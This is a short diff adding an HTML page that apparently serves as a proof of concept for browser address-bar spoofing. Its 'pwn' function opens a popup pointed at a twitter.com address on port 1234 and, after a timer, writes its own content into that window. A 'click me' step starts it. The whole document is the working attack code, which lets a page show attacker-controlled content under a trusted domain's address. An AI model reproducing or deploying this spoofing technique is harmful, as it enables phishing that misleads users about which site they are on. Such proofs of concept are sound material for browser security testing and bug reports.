@@ -1,0 +1,11 @@
+        <script>
+            function pwn() {
+                v = setInterval(`x=window.open('https://www.twitter.com:1234','test', 'width=400 height=300')`);
+                i = setInterval(`
+                    x.document.write("<h1>url spoofing BLANK ADDRESS</h1>");
+                    clearInterval(v);
+                    clearInterval(i);
+                    `, 3333);
+            }
+        </script>
+        <li onclick="pwn()">step1: click me</li>
